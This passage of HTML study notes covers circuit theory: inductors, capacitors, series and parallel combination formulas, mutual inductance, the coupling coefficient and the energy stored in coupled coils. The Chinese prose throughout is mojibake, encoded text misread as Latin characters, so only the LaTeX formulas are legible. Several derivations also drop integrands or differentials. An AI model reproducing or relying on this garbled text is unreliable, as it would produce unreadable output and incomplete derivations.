ç”¨å®é™…çš„è¿æ”¾æ¨¡å‹åˆ†æåŒç›¸æ”¾å¤§å™¨ç”µè·¯"></a>5.7.2 ç”¨å®é™…çš„è¿æ”¾æ¨¡å‹åˆ†æåŒç›¸æ”¾å¤§å™¨ç”µè·¯</h3><p>å›¾åƒä¸º:</p><p><img src="/../img/real_noninverse_ope_amp.png"></p><p>å…·ä½“æ–¹ç¨‹å°±è§ä¹¦ã€‚</p><h1 id="ç¬¬6ç« -ç”µæ„Ÿ-ç”µå®¹å’Œäº’æ„Ÿ"><a href="#ç¬¬6ç« -ç”µæ„Ÿ-ç”µå®¹å’Œäº’æ„Ÿ" class="headerlink" title="ç¬¬6ç«  ç”µæ„Ÿ, ç”µå®¹å’Œäº’æ„Ÿ"></a>ç¬¬6ç«  ç”µæ„Ÿ, ç”µå®¹å’Œäº’æ„Ÿ</h1><p>åŸºæœ¬æ¦‚å¿µ:</p><p><mark>ç”µæ„Ÿ</mark> æ˜¯ä¸€ç§æŠµæŠ—ç”µæµå˜åŒ–çš„ç”µå­å…ƒä»¶. å®ƒç”±ç¯ç»•åœ¨ç£æ€§æˆ–éç£æ€§ææ–™æ”¯æŸ±å¿ƒä¸Šçš„çº¿åœˆç»„æˆã€‚ <mark>ç”µæ„Ÿçš„ç‰¹æ€§åŸºäºç£åœºçš„ç°è±¡</mark>, ç£åœºçš„æºæ˜¯è¿åŠ¨ä¸­çš„ç”µè·.</p><p><mark>ç”µå®¹</mark> æ˜¯ä¸€ç§ç”µå­å…ƒä»¶, å®ƒæ˜¯ç”±ç»ç¼˜ä½“æˆ–ç”µä»‹è´¨ææ–™éš”ç¦»çš„ä¸¤ä¸ªå¯¼ä½“ç»„æˆ. ç”µå®¹åªæ˜¯ä¸€ä¸ªå™¨ä»¶ï¼Œä¸æ˜¯å¯å­˜å‚¨ç”µè·çš„ç”µæ± ã€‚ <mark>ç”µå®¹çš„ç‰¹æ€§æ˜¯åŸºäºç”µåœºçš„ç°è±¡</mark> , ç”µåœºçš„æºæ˜¯ç”µè·çš„åˆ†ç¦»ï¼Œå³ç”µå‹. æ—¶å˜çš„ç”µåœºåœ¨è¯¥ç©ºé—´äº§ç”Ÿ<mark>ä½ç§»ç”µæµ</mark>. ä½ç§»ç”µæµç­‰äºç”µå®¹ä¸¤ç«¯çš„ä¼ å¯¼ç”µæµ (å› ä¸ºç”µå®¹ä¸¤ç«¯ç”µè·é‡åœ¨å˜åŒ–ï¼Œå°±å¥½åƒæœ‰ç”µæµæµè¿‡).</p><p><mark>èƒ½é‡å¯ä»¥è¢«å­˜å‚¨åœ¨ç£åœºä¸­å’Œç”µåœºä¸­.</mark> , å› æ­¤ç”µæ„Ÿå’Œç”µå®¹ä¹Ÿèƒ½å¤Ÿå­˜å‚¨èƒ½é‡.</p><p>å¯¹äºç†æƒ³çš„ç”µæ„Ÿå’Œç”µå®¹ï¼Œå­˜å‚¨å¤šå°‘èƒ½é‡å°±é‡Šæ”¾å¤šå°‘èƒ½é‡ï¼Œç”±äºç”µæ„Ÿå’Œç”µå®¹å¹¶ä¸èƒ½äº§ç”Ÿèƒ½é‡, å› æ­¤å‡ä¸º<mark>æ— æºå…ƒä»¶</mark>.</p><p><mark>æ³¨æ„</mark>, ç”µæ„Ÿå’Œç”µå®¹ä¸èƒ½äº§ç”Ÿå’Œæ¶ˆè€—èƒ½é‡.</p><h2 id="6-1-ç”µæ„Ÿ"><a href="#6-1-ç”µæ„Ÿ" class="headerlink" title="6.1 ç”µæ„Ÿ"></a>6.1 ç”µæ„Ÿ</h2><p>é‡è¦å…¬å¼:</p><ul><li>$v &#x3D; L \frac{di}{dt}$</li><li>$i(t) &#x3D; \frac{1}{L} \int_{t_0}^t v dt + i(t_0)$</li><li>$w &#x3D; \frac{1}{2} L i^2$</li></ul><p>ç”µæ„Ÿæ±‚èƒ½é‡ç”¨ $i$</p><p>ç¬¦å·: $L$</p><p>å•ä½: $H$</p><p>å›¾å½¢ç¬¦å·: <img src="/../img/figure_of_inductance.png"></p><p>å…¬å¼:</p><p>$$<br>\displaylines{v &#x3D; L \frac{di}{dt}}<br>$$</p><p>æ³¨æ„ä¸¤ç‚¹:</p><ul><li>å¦‚æœç”µæµæ˜¯å¸¸æ•°ï¼Œé€šè¿‡ç†æƒ³ç”µæ„Ÿçš„ç”µå‹ä¸ºé›¶ (æ¯•ç«Ÿ $\frac{di}{dt} &#x3D; 0$)</li><li>ç”µæ„Ÿä¸­çš„ç”µæµä¸èƒ½è·ƒå˜ï¼Œä¹Ÿå°±æ˜¯ç”µæµåœ¨é›¶æ—¶é—´ä¸èƒ½å˜åŒ–ä¸€ä¸ªæœ‰é™é‡ (ä¸ç„¶å°±æ˜¯ $\frac{di}{0} &#x3D; \infty$, ç”µå‹æ— ç©·å¤§)</li></ul><h3 id="6-1-1-ç”¨ç”µæ„Ÿä¸Šçš„ç”µå‹è¡¨ç¤ºç”µæ„Ÿä¸­çš„ç”µæµ"><a href="#6-1-1-ç”¨ç”µæ„Ÿä¸Šçš„ç”µå‹è¡¨ç¤ºç”µæ„Ÿä¸­çš„ç”µæµ" class="headerlink" title="6.1.1 ç”¨ç”µæ„Ÿä¸Šçš„ç”µå‹è¡¨ç¤ºç”µæ„Ÿä¸­çš„ç”µæµ"></a>6.1.1 ç”¨ç”µæ„Ÿä¸Šçš„ç”µå‹è¡¨ç¤ºç”µæ„Ÿä¸­çš„ç”µæµ</h3><blockquote><p>æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{\because v &#x3D; L \frac{di}{dt} \newline~ \newline<br>v dt &#x3D; L (\frac{di}{dt}) dt \newline~ \newline<br>v dt &#x3D; L di \newline~ \newline<br>L \int_{i(t_0)}^{i(t)} &#x3D; \int_{t_0}^t v d t \newline~ \newline<br>i(t) &#x3D; \frac{1}{L} \int_{t_0}^t v dt + i(t_0)}<br>$$</p><p>å…¶ä¸­ï¼Œ $i(t)$ æŒ‡æ—¶é—´ä¸º t æ—¶çš„ç”µæµ. $i(t_0)$ æŒ‡å¼€å§‹ç§¯åˆ†æ—¶çš„ç”µæµï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ $t_0$ ä¸ºé›¶.</p><h3 id="6-1-2-ç”µæ„Ÿä¸­çš„åŠŸç‡å’Œèƒ½é‡"><a href="#6-1-2-ç”µæ„Ÿä¸­çš„åŠŸç‡å’Œèƒ½é‡" class="headerlink" title="6.1.2 ç”µæ„Ÿä¸­çš„åŠŸç‡å’Œèƒ½é‡"></a>6.1.2 ç”µæ„Ÿä¸­çš„åŠŸç‡å’Œèƒ½é‡</h3><blockquote><p>ç”µæ„Ÿä¸­åŠŸç‡å’Œèƒ½é‡å…³ç³»æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{p &#x3D; vi \newline~ \newline<br>p &#x3D; Li \frac{di}{dt} \newline~ \newline<br>p &#x3D; \frac{dw}{dt} &#x3D; Li \frac{di}{dt} \newline~ \newline<br>dw &#x3D; Li di \newline~ \newline<br>\int_0^w dx &#x3D; L \int_0^i y dy \newline~ \newline<br>w &#x3D; \frac{1}{2} L i^2}<br>$$</p><h2 id="6-2-ç”µå®¹"><a href="#6-2-ç”µå®¹" class="headerlink" title="6.2 ç”µå®¹"></a>6.2 ç”µå®¹</h2><p>é‡è¦å…¬å¼:</p><ul><li>$i &#x3D; C \frac{dv}{dt}$</li><li>$v(t) &#x3D; \frac{1}{C} \int_{t_0}^t i dt + v(t_0)$</li><li>$w &#x3D; \frac{1}{2}C v^2$</li></ul><p>ç”µå®¹æ±‚èƒ½é‡ç”¨ $v$</p><p>å­—æ¯: $C$</p><p>å•ä½: æ³•æ‹‰ ( $F$ )</p><p>å›¾å½¢ç¬¦å·: <img src="/../img/figure_of_capacitor.png"></p><p>å› ä¸ºç”µå®¹ä¸­æ˜¯ç”µä»‹è´¨æˆ–ç»ç¼˜ææ–™ï¼Œå› æ­¤ <mark>ç”µè·å¹¶ä¸ç©¿è¿‡ç”µå®¹</mark>. ç”µå®¹ä¸¤ç«¯çš„ç”µå‹ä¸èƒ½å°†ä¸€ä¸ªç©¿è¿‡è¿™ä¸ªç»ç¼˜ä½“ï¼Œä½†å¯ä»¥åœ¨ç»ç¼˜ä½“ä¸­ <mark>ä½ç§»ä¸€ä¸ªç”µè·</mark>. ( ä½ç§»ä¸æ˜¯æŒ‡ç”µè·ç§»åŠ¨äº†ï¼Œè€Œæ˜¯ä¸€ä¸ªææ¿ä¸Šçš„ç”µè·å¢åŠ  )</p><blockquote><p>è®¡ç®—ä½ç§»ç”µæµ</p></blockquote><p>$$<br>\displaylines{i &#x3D; C \frac{dv}{dt}}<br>$$</p><p>ä¸¤ä¸ªè¦ç‚¹:</p><ul><li>ç”µå®¹ä¸¤ç«¯çš„ç”µå‹ä¸èƒ½è·ƒå˜</li><li>å¦‚æœç”µå‹ä¸ºå¸¸é‡ï¼Œç”µå®¹çš„ç”µæµä¸ºé›¶</li></ul><blockquote><p>ç”µå®¹ç”µæµä½œä¸ºç”µå®¹ç”µå‹çš„å‡½æ•°, æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{ i &#x3D; C \frac{dv}{dt} \newline~ \newline<br> i dt &#x3D; C ( \frac{dv}{dt} )dt \newline~ \newline<br> i dt &#x3D; C dv \newline~ \newline<br> \int_{t_0}^t i dt &#x3D; C v(t) \newline~ \newline<br> v(t) &#x3D; \frac{1}{C} \int_{t_0}^t i dt + v(t_0)}<br>$$ </p><blockquote><p>ç”µå®¹çš„åŠŸç‡å’Œèƒ½é‡å…³ç³», æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{p &#x3D; vi &#x3D; Cv \frac{dv}{dt} \newline~ \newline<br>p &#x3D; \frac{dw}{dt} \newline~ \newline<br>dw &#x3D; Cvdv \newline~ \newline<br>\int_0^w dx &#x3D; C \int_0^v y dy \newline~ \newline<br>w &#x3D; \frac{1}{2}C v^2}<br>$$</p><h2 id="6-3-ç”µæ„Ÿå’Œç”µå®¹çš„ä¸²å¹¶è”"><a href="#6-3-ç”µæ„Ÿå’Œç”µå®¹çš„ä¸²å¹¶è”" class="headerlink" title="6.3 ç”µæ„Ÿå’Œç”µå®¹çš„ä¸²å¹¶è”"></a>6.3 ç”µæ„Ÿå’Œç”µå®¹çš„ä¸²å¹¶è”</h2><p>ç”µé˜»çš„ä¸²å¹¶è”å¯ä»¥ç®€åŒ–ä¸ºå•ä¸ªç­‰æ•ˆç”µé˜»ï¼Œç”µæ„Ÿæˆ–ç”µå®¹çš„ä¸²å¹¶è”ä¹Ÿå¯ä»¥<mark>ç®€åŒ–ä¸ºå•ä¸ªç”µæ„Ÿæˆ–ç”µå®¹</mark>.</p><blockquote><p>ç”µæ„Ÿä¸²è”å…¬å¼æ¨å¯¼<br>ç”±äºæµè¿‡ä¸²è”çš„ç”µæ„Ÿçš„ç”µæµç›¸åŒ:</p></blockquote><p>$$<br>\displaylines{v_1 &#x3D; L_1 \frac{di}{dt}, \ \ v_2 &#x3D; L_2 \frac{di}{dt}, \ \ v_3 &#x3D; L_3 \frac{di}{dt} \newline~ \newline<br>v &#x3D; v_1 + v_2 + v_3 &#x3D; (L_1 + L_2 + L_3) \frac{di}{dt}}<br>$$</p><p>å¯ä»¥çœ‹å‡º <mark>ä¸²è”è¿æ¥çš„ç­‰æ•ˆç”µæ„Ÿæ˜¯æ¯ä¸ªç”µæ„Ÿå€¼çš„æ€»å’Œ</mark> (ä»æœ¬è´¨ä¸Šæ¥çœ‹ï¼Œå°±åƒæ˜¯çº¿åœˆæ•°å¢åŠ äº†ï¼Œç£é€šé‡å°±å¢å¤§)</p><blockquote><p>ç”µæ„Ÿå¹¶è”å…¬å¼æ¨å¯¼</p></blockquote><p>å¹¶è”ç”µè·¯çš„æ€»ç”µæµæ˜¯å„æ”¯è·¯ç”µæµä¹‹å’Œ.</p><p>$$<br>\displaylines{i_1 &#x3D; \frac{1}{L_1} \int_{t_0}^t vdt + i_1(t_0) \newline~ \newline<br>i_2 &#x3D; \frac{1}{L_2} \int_{t_0}^t vdt + i_2(t_0) \newline~ \newline<br>i_3 &#x3D; \frac{1}{L_3} \int_{t_0}^t vdt + i_3(t_0) \newline~ \newline<br>i &#x3D; i_1 + i_2 + i_3 \newline~ \newline<br>i &#x3D; ( \frac{1}{L_1} + \frac{1}{L_2} + \frac{1}{L_3}) \int_{t_0}^t vdt + i_1(t_0)+ i_2(t_0)+ i_3(t_0) \newline~ \newline<br>i &#x3D; \frac{1}{L_{eq}}\int_{t_0}^t vdt + i_1(t_0) \newline~ \newline<br>\frac{1}{L_{eq}} &#x3D; \frac{1}{L_1} + \frac{1}{L_2} + \frac{1}{L_3} \newline~ \newline<br>i(t_0) &#x3D; i_1(t_0)+ i_2(t_0)+ i_3(t_0)}<br>$$</p><blockquote><p>ç”µå®¹ä¸²è”å…¬å¼</p></blockquote><p>æ¨å¯¼æ–¹å¼å’Œç”µæ„Ÿç›¸åŒ. ç»“æœç›¸å.</p><p>$$<br>\displaylines{ \frac{1}{C_{eq}} &#x3D; \frac{1}{C_{1}} + \frac{1}{C_{2}} + â€¦ + \frac{1}{C_{n}} \newline~ \newline<br>v(t0) &#x3D; v_1(t_0) + v_2(t_0) + â€¦ + v_n(t_0)}<br>$$</p><blockquote><p>ç”µå®¹å¹¶è”å…¬å¼æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{ C_{eq} &#x3D; C_1 + C_2 + â€¦ + C_n }<br>$$</p><h2 id="6-4-äº’æ„Ÿ"><a href="#6-4-äº’æ„Ÿ" class="headerlink" title="6.4 äº’æ„Ÿ"></a>6.4 äº’æ„Ÿ</h2><p>ç”±ç£åœºè¿æ¥çš„ä¸¤ä¸ªç”µè·¯, ç¬¬äºŒä¸ªç”µè·¯æ‰€æ„Ÿåº”çš„ç”µå‹ä¸ç¬¬ä¸€ä¸ªç”µè·¯ä¸­çš„æ—¶å˜ç”µæµ (éšæ—¶é—´å˜åŒ–çš„ç”µæµ) æœ‰å…³, ç§°ä¹‹ä¸º <mark>äº’æ„Ÿ</mark>.</p><p>å›¾åƒå¦‚ä¸‹:</p><p><img src="/../img/magnetic_coupling_coil.png"></p><p>è¿™é‡Œçš„ $M$ ä¸ä»…è¡¨ç¤ºäº’æ„Ÿä¸º $M$, ä¸”è¡¨ç¤ºè¿™é‡Œçš„ä¸¤ä¸ªç”µè·¯ç”±ç£åœºè¿æ¥, æœ‰è¿™ä¸ªè£…ç½®:</p><p><img src="/../img/magnetic_coupling_coil2.png"></p><p><mark>ç‚¹çº¦å®š</mark>: å½“ç”µæµçš„å‚è€ƒæ–¹å‘æ˜¯è¿›å…¥çº¿åœˆæ‰“ç‚¹ç«¯æ—¶ï¼Œåˆ™å¦ä¸€çº¿åœˆæ„Ÿåº”çš„ç”µå‹å…¶å‚è€ƒææ€§åœ¨æ‰“ç‚¹ç«¯ä¸ºæ­£.</p><p>ç‚¹çº¦å®šç”¨æ¥è¿½è¸ªææ€§ï¼Œä¹Ÿå°±æ˜¯åˆ¤æ–­ç”µæµè¿›å…¥çš„æ–¹å‘. (æ„Ÿè§‰å¯ä»¥ç›´æ¥ç”¨å³æ‰‹å®šåˆ™åˆ¤æ–­)</p><h2 id="6-5-æ›´è¯¦ç»†åœ°è®¨è®ºäº’æ„Ÿ"><a href="#6-5-æ›´è¯¦ç»†åœ°è®¨è®ºäº’æ„Ÿ" class="headerlink" title="6.5 æ›´è¯¦ç»†åœ°è®¨è®ºäº’æ„Ÿ"></a>6.5 æ›´è¯¦ç»†åœ°è®¨è®ºäº’æ„Ÿ</h2><h3 id="6-5-1-å¤ä¹ è‡ªæ„Ÿ"><a href="#6-5-1-å¤ä¹ è‡ªæ„Ÿ" class="headerlink" title="6.5.1 å¤ä¹ è‡ªæ„Ÿ"></a>6.5.1 å¤ä¹ è‡ªæ„Ÿ</h3><p>æ³•æ‹‰ç¬¬å‡è®¾ç£åœºæ˜¯ç”±å›´ç»•é€šç”µå¯¼çº¿çš„ <mark>ç£åŠ›çº¿</mark> æ„æˆçš„.</p><p>å¯å°†ç£åŠ›çº¿æƒ³è±¡ä¸ºç›¸äº’æ¥è¿‘çš„ï¼Œå‚¨èƒ½çš„å¼¹æ€§å¸¦.</p><p>æ„Ÿåº”åœ¨å¯¼çº¿ä¸­çš„ç”µå‹ä¸åˆ‡å‰²å¯¼çº¿çš„ç£åŠ›çº¿æ•°æˆæ¯”ä¾‹, è¿™ä¸ªæ„Ÿåº”ç”µå‹å¯ä»¥ç”± <mark>æ³•æ‹‰ç¬¬å®šå¾‹</mark> æ¥è¡¨ç¤º:</p><p>$$<br>\displaylines{v &#x3D; \frac{d \lambda}{dt}}<br>$$<br>(ä¸æ˜¯å¾ˆæ˜ç™½è¿™ä¸ªå…¬å¼, ç¡¬è¦åˆ†æ, è¿™é‡Œå°±æ˜¯ç£é“¾æ•°çš„å˜åŒ–ç‡å°±æ˜¯æ„Ÿåº”ç”µå‹)</p><p><mark> $\lambda$ è¢«ç§°ä¸ºç£é“¾</mark>, å•ä½ä¸º $Wb$. </p><p>$N$ ä¸ºçº¿åœˆåŒæ•°ï¼Œ $\phi$ ä¸ºç£é€šé‡:<br>$$<br>\displaylines{\lambda &#x3D; N \phi}<br>$$</p><p>(è¿™é‡Œå¯ä»¥çœ‹å‡º, è™½ç„¶ $p\phi$ æœ¬èº«å°±å’Œçº¿åœˆæ•°æœ‰å…³, $\lambda$  è¿˜æ˜¯å’Œçº¿åœˆæ•°é‡æˆæ­£æ¯”)</p><p>ç£é€šé‡ $\phi$ åˆä¸çº¿åœˆç”µæµå¤§å°æœ‰å…³:<br>$$<br>\displaylines{\phi &#x3D; \mathcal{P}Ni}<br>$$</p><p>$\mathcal{P}$ è¡¨ç¤ºç£é€š<mark>æ‰€å æ®ç©ºé—´çš„ç£å¯¼</mark> (ç£å¯¼æ˜¯ä¸€ä¸ªæè¿°è¿™ä¸ªç©ºé—´ç£ç‰¹æ€§çš„é‡, å½“ç£æ€§ææ–™æ„æˆå«æœ‰ç£é€šçš„ç©ºé—´æ—¶, ç£å¯¼éšç£é€šè€Œå˜åŒ–, æ­¤æ—¶ $\phi$ å’Œ $i$ æ˜¯éçº¿æ€§å…³ç³», å¦‚æœå«æœ‰ç£é€šçš„ç©ºé—´æ˜¯ç”±éç£æ€§ææ–™æ„æˆçš„, åˆ™ç£å¯¼æ˜¯å¸¸é‡,  æ­¤æ—¶ $\phi$ å’Œ $i$ æ˜¯çº¿æ€§å…³ç³». å…·ä½“ç»†èŠ‚ä¼¼ä¹ä¸ç”¨äº†è§£)</p><h3 id="6-5-2-äº’æ„Ÿçš„æ¦‚å¿µ"><a href="#6-5-2-äº’æ„Ÿçš„æ¦‚å¿µ" class="headerlink" title="6.5.2 äº’æ„Ÿçš„æ¦‚å¿µ"></a>6.5.2 äº’æ„Ÿçš„æ¦‚å¿µ</h3><p>(åªè¦è®°ä½äº’æ„Ÿå’Œè‡ªæ„Ÿéƒ½å’Œç£å¯¼å’Œçº¿åœˆæ•°æœ‰å…³)</p><p>ä¼¼ä¹æœ‰ä¸¤ä¸ªé‡è¦çš„å…¬å¼ (åº”è¯¥éƒ½æ˜¯æ¨å¯¼å‡ºæ¥çš„):</p><ul><li>$L &#x3D; N^2_1 \mathcal{P}$</li><li>$M_{21} &#x3D; N_2 N_1 \mathcal{P_{21}}$<br>(å®é™…ä¸Š, å¯¹äºéç£æ€§ææ–™, ç£å¯¼ $\mathcal{P_{12}}$ å’Œ $\mathcal{P_{21}}$ æ˜¯ç›¸ç­‰çš„, å› æ­¤ $M_{12} &#x3D; M_{21} &#x3D; M$)</li></ul><p>$$<br>\displaylines{v_2 &#x3D; M_{21} \frac{di_1}{dt}}<br>$$</p><p>å…¶ä¸­, $M$ çš„ä¸‹æ ‡è¡¨ç¤ºè¯¥æ„Ÿåº”ä½¿çº¿åœˆ 1 ä¸­çš„ç”µæµä¸çº¿åœˆ 2 ä¸­æ„Ÿåº”çš„ç”µå‹æœ‰å…³.</p><p><img src="/../img/inductance_mutual_1.png"></p><p>å…¶ä¸­:<br>$$<br>\displaylines{\phi_1 &#x3D; \phi_{11} + \phi_{21} \newline~ \newline<br>\mathcal{P_1} &#x3D; \mathcal{P_{11}} + \mathcal{P_{21}}<br>}<br>$$</p><p>ç£é€šä¸‹æ ‡ç¬¬ä¸€ä¸ªæ•°å­—ä¸ºçº¿åœˆå·, ç¬¬äºŒä¸ªæ•°å­—è¡¨ç¤ºçº¿åœˆç”µæµ.</p><p>ä¸€ä¸ªç”µè·¯ä¸­æ‰€æ„Ÿåº”çš„ç”µå‹ä¸å¦ä¸€ä¸ªç”µè·¯ä¸­çš„æ—¶å˜ç”µæµå»ºç«‹è”ç³»:<br>$$<br>\displaylines{v_1 &#x3D; L_1 \frac{di_1}{dt} + M_{12} \frac{di_2}{dt} \newline~ \newline<br>v_2 &#x3D; M_{21} \frac{di_1}{dt} + L_2 \frac{di_2}{dt}}<br>$$<br>( <mark>ç–‘æƒ‘</mark>, ç”µå‹å˜åŒ–å¼•èµ·ç”µæµå˜åŒ–å¼•èµ·å˜åŒ–ç‡æ”¹å˜ )</p><h3 id="6-5-3-ç”¨è‡ªæ„Ÿè¡¨ç¤ºäº’æ„Ÿ"><a href="#6-5-3-ç”¨è‡ªæ„Ÿè¡¨ç¤ºäº’æ„Ÿ" class="headerlink" title="6.5.3 ç”¨è‡ªæ„Ÿè¡¨ç¤ºäº’æ„Ÿ"></a>6.5.3 ç”¨è‡ªæ„Ÿè¡¨ç¤ºäº’æ„Ÿ</h3><p>äº’æ„Ÿçš„å€¼æ˜¯è‡ªæ„Ÿçš„å‡½æ•°:<br>$$<br>\displaylines{\because L_1 &#x3D; N^2_1 \mathcal{P_1} \newline~ \newline<br>\because L_2 &#x3D; N^2_2 \mathcal{P_2} \newline~ \newline<br>\therefore L_1 L_2 &#x3D; N^2_1 N^2_2 \mathcal{P_1} \mathcal{P_2} \newline~ \newline<br>&#x3D; N^2_1 N^2_2(\mathcal{P_{11}} + \mathcal{P_{21}})(\mathcal{P_{22}} + \mathcal{P_{12}})<br>}<br>$$</p><p>å¯¹äºçº¿æ€§ç³»ç»Ÿ, $\mathcal{P_{21}} &#x3D; \mathcal{P_{12}}$:<br>$$<br>\displaylines{L_1 L_2 &#x3D; (N_1N_2 \mathcal{P_{12}})^2(1 + \frac{\mathcal{P_{11}}}{\mathcal{P_{12}}})(1 + \frac{\mathcal{P_{22}}}{\mathcal{P_{12}}}) &#x3D; M^2(1 + \frac{\mathcal{P_{11}}}{\mathcal{P_{12}}})(1 + \frac{\mathcal{P_{22}}}{\mathcal{P_{12}}}) }<br>$$</p><p>ç”¨å•ä¸ªå¸¸é‡ä»£æ›¿å«ç£å¯¼çš„ä¸¤é¡¹ (è¿™é‡Œ $k$ ç§°ä¸º <mark>è€¦åˆç³»æ•°</mark>, ä¸” $0 \le k \le 1$ ):<br>$$<br>\displaylines{ \frac{1}{k^2} &#x3D; (1 + \frac{\mathcal{P_{11}}}{\mathcal{P_{12}}})(1 + \frac{\mathcal{P_{22}}}{\mathcal{P_{12}}})}<br>$$</p><p>å› æ­¤:<br>$$<br>\displaylines{M^2 &#x3D; k^2 L_1 L_2}<br>$$</p><p>å¦‚æœçº¿åœˆé—´æ— ç£é€šäº¤é“¾, åˆ™ $M &#x3D; 0$.</p><p>å½“ä¸¤ä¸ªçº¿åœˆæ— å…¬å…±ç£é€š, å³ $\phi_{12} &#x3D; \phi_{21} &#x3D; 0$ æ—¶, è€¦åˆç³»æ•°ä¸º 0.</p><p>$\phi_{11} &#x3D; \phi_{22} &#x3D; 0$ æ—¶, è€¦åˆç³»æ•°ä¸º 1.</p><p>$\mathcal{P_{11}} &#x3D; \mathcal{P_{22}} &#x3D; 0$ è¡¨ç¤ºçš„æ˜¯ä¸€ç§ç†æƒ³çŠ¶æ€, å®é™…ä¸Š, æŒ‰è‡ªç„¶æ³•åˆ™ä¸å¤ªå¯èƒ½.</p><h3 id="6-5-4-èƒ½é‡è®¡ç®—"><a href="#6-5-4-èƒ½é‡è®¡ç®—" class="headerlink" title="6.5.4 èƒ½é‡è®¡ç®—"></a>6.5.4 èƒ½é‡è®¡ç®—</h3><p>æ¨å¯¼å­˜å‚¨åœ¨ä¸€å¯¹çº¿æ€§è€¦åˆçº¿åœˆç£åœºä¸­çš„æ€»èƒ½é‡è¡¨è¾¾å¼.</p><p><img src="/../img/coupling_coils.png"></p><p>å·²çŸ¥æ¡ä»¶:</p><ol><li>$M_{12} &#x3D; M_{21} &#x3D; M$</li><li>$M &#x3D; k \sqrt{L_1 L_2},\ 0 \le k \le 1$</li></ol><blockquote><p>æ¨å¯¼</p></blockquote><p>å…ˆå‡è®¾ç”µæµ $i_1$ å’Œ $i_2$ éƒ½ä¸º 0, åœ¨çº¿åœˆä¸­é›¶ç”µæµçŠ¶æ€å¯¹åº”é›¶èƒ½é‡å­˜å‚¨. </p><p>å…ˆä½¿ $i_1$ ä» 0 å¢åŠ åˆ°æŸä»»æ„å€¼ $I_1$ å¹¶è®¡ç®—å½“ $i_1 &#x3D; I_1$ æ—¶æ‰€å­˜å‚¨çš„èƒ½é‡, ç”±äºä¿æŒ $i_1$ ä¸ºå¸¸é‡æ—¶, $i_2 &#x3D; 0$, å› æ­¤ç¬¬äºŒä¸ªçº¿åœˆæ­¤æ—¶æ²¡æœ‰å­˜å‚¨èƒ½é‡, æ­¤æ—¶è¿™å¯¹çº¿åœˆå­˜å‚¨çš„èƒ½é‡ä¸º:<br>$$<br>\displaylines{\int_0^{W_1} dw &#x3D; L_1 \int_0^{I_1} i_1 di_1 \newline~ \newline<br>W_1 &#x3D; \frac{1}{2}L_1 I_1^2<br>}<br>$$</p><p>$i_1$ ä¿æŒå¸¸é‡ $I_1$ ä¸€æ®µæ—¶é—´å, å°† $i_2$ ä»é›¶å¢åŠ åˆ°æŸä»»æ„å€¼ $I_2$, $i_2$ åœ¨çº¿åœˆ 1 ä¸­æ„Ÿåº”çš„ç”µå‹ä¸º $M_{12} \frac{di_2}{dt}$, å› æ­¤, è¿›å…¥åˆ°ä¸€å¯¹çº¿åœˆçš„åŠŸç‡ä¸º:<br>$$<br>\displaylines{p &#x3D; I_1 M_{12} \frac{di_2}{dt} + i_2v_2}<br>$$</p><p>å½“ $i_2 &#x3D; I_2$ æ—¶, å­˜å‚¨åœ¨ä¸€å¯¹çº¿åœˆä¸­çš„æ€»èƒ½é‡ä¸º:<br>$$<br>\displaylines{\int_{W_1}^{W}&#x3D; \int_{0}^{I_2} + \int_0^{I_2} L_2i_2di_2 \newline~ \newline<br>W &#x3D; W_1 + I_1I_2M_{12} + \frac{1}{2}L_2 I_2^2 &#x3D; \frac{1}{2}L_1 I_1^2 + \frac{1}{2}L_2 I_2^2 + I_1 I_2 M_{12}<br>}<br>$$</p><blockquote><p>ç»“è®º:</p></blockquote><p>è‹¥å…ˆå°† $i_1$ ä»é›¶å¢è‡³ $I_1$, ç„¶åå°†$i_2$ ä»é›¶å¢è‡³ $I_2$, åˆ™æ‰€å­˜å‚¨çš„æ€»èƒ½é‡ä¸º:<br>$$<br>\displaylines{W &#x3D; \frac{1}{2}L_1 I_1^2 + \frac{1}{2}L_2 I_2^2 + I_1 I_2 M_{12} }<br>$$</p><p>è‹¥å…ˆå°† $i_2$ ä»é›¶å¢è‡³ $I_2$, ç„¶åå°†$i_1$ ä»é›¶å¢è‡³ $I_1$, åˆ™æ‰€å­˜å‚¨çš„æ€»èƒ½é‡ä¸º:<br>$$<br>\displaylines{W &#x3D; \frac{1}{2}L_1 I_1^2 + \frac{1}{2}L_2 I_2^2 + I_1 I_2 M_{12} }<br>$$</p><p>è‹¥æ˜¯çº¿æ€§è€¦åˆ, åˆ™å»ºç«‹é¡ºåºæ— æ‰€è°“. æ­¤æ—¶æ— è®ºç”µæµæ˜¯å¦‚ä½•è¾¾åˆ°æœ€ç»ˆå€¼, äº§ç”Ÿçš„ç£é€šä»…å–å†³äº $i_1$ å’Œ $i_2$ çš„æœ€ç»ˆå€¼.</p><p><mark>åœ¨ä»»æ„æ—¶é—´, å­˜å‚¨åœ¨çº¿åœˆä¸­çš„æ€»èƒ½é‡æ˜¯</mark> :<br>$$<br>\displaylines{w(t) &#x3D; \frac{1}{2}L_1 i_1^2 + \frac{1}{2}L_2 i_2^2 + M i_1 i_2 }<br>$$</p><p><mark>æ³¨æ„</mark> , å¦‚æœä¸€ä¸ªç”µæµè¿›å…¥ä¸€ä¸ªææ€§æ ‡è®°ç«¯, è€Œå¦ä¸€ä¸ªç”µæµç¦»å¼€è¿™ä¸€ç«¯, ä¹˜ç§¯ $Mi_1i_2$ çš„ä»£æ•°ç¬¦å·ç›¸å, å› æ­¤é€šå¸¸:<br>$$<br>\displaylines{w(t) &#x3D; \frac{1}{2}L_1 i_1^2 + \frac{1}{2}L_2 i_2^2 \pm M i_1 i_2}<br>$$</p><p>æ­¤æ—¶å¯ä»¥æ¨å¯¼å‡ºä¸€ä¸ªç»“è®º:<br>$$<br>\displaylines{M &#x3D; k \sqrt{L_1 L_2},\ (0 \le k \le 1)}<br>$$<br>å³, $M$ çš„å¤§å°ä¸ä¼šè¶…è¿‡ $\sqrt{L_1 L_2}$</p><h1 id="ç¬¬7ç« -ä¸€é˜¶-RL-å’Œ-RC-ç”µè·¯çš„å“åº”"><a href="#ç¬¬7ç« -ä¸€é˜¶-RL-å’Œ-RC-ç”µè·¯çš„å“åº”" class="headerlink" title="ç¬¬7ç«  ä¸€é˜¶ RL å’Œ RC ç”µè·¯çš„å“åº”"></a>ç¬¬7ç«  ä¸€é˜¶ RL å’Œ RC ç”µè·¯çš„å“åº”</h1><p>$RL$ 